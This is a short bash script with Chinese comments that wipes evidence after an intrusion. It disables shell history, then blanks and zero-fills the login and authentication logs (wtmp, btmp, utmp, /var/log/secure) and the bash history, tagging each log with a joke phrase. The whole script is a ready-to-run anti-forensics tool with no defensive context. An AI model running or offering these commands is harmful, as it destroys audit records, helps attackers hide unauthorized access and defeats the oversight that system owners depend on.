#!/bin/bash

#不记录历史命令
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG;
export HISTFILE=/dev/null;
export HISTSIZE=0;
export HISTFILESIZE=0

sudo echo "">/var/log/wtmp   #清理登陆记录 
sudo dd if=/dev/zero of=/var/log/wtmp  bs=50M count=1
sudo echo 我爱黑丝 >> /var/log/wtmp

sudo echo "">/var/log/btmp   #清除错误登陆信息
sudo dd if=/dev/zero of=/var/log/btmp  bs=50M count=1
sudo echo 我爱黑丝 >> /var/log/btmp

sudo echo "">/var/log/utmp   #删除已登录用户信息
sudo dd if=/dev/zero of=/var/log/utmp  bs=50M count=1
sudo echo 我爱黑丝 >> /var/log/utmp
sudo cat "">  /var/log/secure    #清除安全日志
sudo dd if=/dev/zero of=/var/log/secure
sudo echo 我爱黑丝 >> /var/log/secure

sudo dd if=/dev/zero of=~/.bash_history bs=50M count=1
